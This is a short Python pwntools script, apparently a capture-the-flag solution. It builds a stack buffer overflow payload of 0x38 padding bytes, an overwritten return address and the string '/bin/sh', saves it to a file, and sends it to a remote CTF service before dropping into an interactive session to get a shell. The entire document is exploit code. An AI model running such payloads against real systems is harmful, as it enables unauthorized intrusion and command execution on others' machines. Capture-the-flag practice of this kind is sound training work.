from pwn import * 
import struct

qq =  b"A" * 0x38 + struct.pack("<Q", 0x00000000004006c7) + b'/bin/sh'


print(qq)
with open('payload.txt', 'wb') as f:
    f.write(qq)

context(arch = 'i386', os = 'linux')

#r = process('./hello')
r = remote('ctf.adl.tw', 11002)
# EXPLOIT CODE GOES HERE
r.send(qq)
r.recv()
r.interactive()
